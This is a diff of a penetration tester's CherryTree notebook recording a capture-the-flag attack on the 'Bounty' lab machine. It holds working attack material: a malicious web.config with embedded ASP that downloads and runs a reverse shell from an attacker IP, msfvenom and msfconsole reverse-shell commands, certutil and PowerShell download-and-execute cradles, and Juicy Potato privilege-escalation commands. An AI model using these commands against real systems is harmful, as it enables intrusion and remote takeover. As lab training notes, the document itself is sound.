@@ -17,9 +17,9 @@ Windows Proof: </rich_text>
     <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1701295759">
+    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1701637703">
       <node name="Nmap" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701290684" ts_lastsave="1701290707">
-        <rich_text></rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Writeups  ./nmapScanTCP.sh 10.10.10.93 HTB/Bounty/nmap/nmap_allTCP.log
 USAGE: ./nmapScanTCP.sh &lt;inputip&gt; &lt;outputfile&gt;
 
@@ -78,7 +78,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds
 </codebox>
       </node>
       <node name="DirectoryBF" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701290815" ts_lastsave="1701293204">
-        <rich_text></rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                                           
  DirectoryBF  gobuster dir -e -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 100 -o gobuster.log
 ===============================================================
@@ -117,7 +117,9 @@ http://10.10.10.93/**http%3A.aspx       (Status: 400) [Size: 11]
 
 but apparenlty we also can check all the extensions that are allowed to be uploaded by creating a list and then using burp to upload all of them
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 and i see that i can upload .config file
 
@@ -131,12 +133,16 @@ on searching i realised there is web.config exploit
 we can host a powershell file on http port 80 call shell.ps1 and then use the following to get the reverse shell
 
 value of shell.ps1
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 we can use the following web.config file to get a reverse shell
 
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 and we get a reverse shell with our foothold and get the flag</rich_text>
@@ -168,7 +174,7 @@ Response.write(o)
 %&gt;
 </codebox>
       </node>
-      <node name="privesc" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701295759" ts_lastsave="1701298116">
+      <node name="privesc" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701295759" ts_lastsave="1701633034">
         <rich_text>after running the ps1 file </rich_text>
         <rich_text link="webs https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</rich_text>
         <rich_text> 
@@ -187,13 +193,126 @@ and searching explitdb we see </rich_text>
 
 
 we download it using at the desktop
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+then use the exploit to get reverse shell via
+
+but that didnt work so i got the sysinfo and used it with wes it gave me so much output i got lost
+
+so then first i copied juicy potato to target machine, along with the powershell revshell and this bat file that exectures the revshell to port  </rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+that also didnt work so finally
 
 
+i used meterpreter:
+
+i created the following payload to get a better shell
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+then transferred it via
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+started the listener via
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+once i got the better shell i run metasploit exploit suggester
 </rich_text>
         <codebox char_offset="100" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Title : ClientCopyImage Win32k
 MSBulletin : MS15-051
 ---snip---</codebox>
         <codebox char_offset="214" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> certutil.exe -urlcache -f http://10.10.14.21/37049.exe exploit.exe</codebox>
+        <codebox char_offset="509" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">4343</codebox>
+        <codebox char_offset="622" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.21 LPORT=4444 -f exe -o meterpreter.exe</codebox>
+        <codebox char_offset="649" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil.exe -urlcache -f http://10.10.14.21/meterpreter.exe meterpreter.exe</codebox>
+        <codebox char_offset="678" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/x64/powershell_reverse_tcp; set LHOST 10.10.14.21; set LPORT 4444; run"</codebox>
+      </node>
+      <node name="privEsc_Reloaded" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701637703" ts_lastsave="1701642311">
+        <rich_text>first of all i tried to get the first shell again but this time with an exe  by creating a windows revshell
+
+and then using the following web.config
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+once i have a good shell i will did</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+and we find
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+here we see SeImpersonatePrivilege is available so we use juicy potato .
+I got to know that once u nc connection is maintained u can use the same port, i didnt know that lol so we can simply transfer both juicy potato and rev.exe and run them together to get admin via this command
+
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+again juicy potato didnt work but with sherlock i see </rich_text>
+        <codebox char_offset="149" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy="Read, Script, Write"&gt;
+         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /&gt;         
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=".config" /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment="web.config" /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;%
+Set shell = CreateObject("WScript.Shell")
+Set cmd = shell.Exec("cmd /c certutil -urlcache -f http://10.10.14.21/rev.exe c://users//public//rev.exe &amp;&amp; c://users//public//rev.exe")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%&gt;
+</codebox>
+        <codebox char_offset="188" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /priv</codebox>
+        <codebox char_offset="204" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</codebox>
+        <codebox char_offset="491" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">jp.exe -p rev.exe -l 1337 -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</codebox>
+        <codebox char_offset="495" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">jp.exe -p rev1.exe -l 5555 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
@@ -1021,7 +1140,7 @@ Process p</rich_text>
         </node>
       </node>
       <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
-        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1701628800">
           <rich_text underline="single" scale="h1">Powershell</rich_text>
           <rich_text>
 
@@ -1048,7 +1167,17 @@ powershell.exe -NoProfile -encoded $Encoded</rich_text>
           <rich_text>
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Transfer and run without downloading
+
 </rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <codebox char_offset="699" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> powershell -c IEX (New-Object Net.Webclient).DownloadString('http://10.10.14.21/shell.ps1</codebox>
+          <codebox char_offset="702" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
         </node>
         <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
           <rich_text underline="single" scale="h1">Certutil</rich_text>
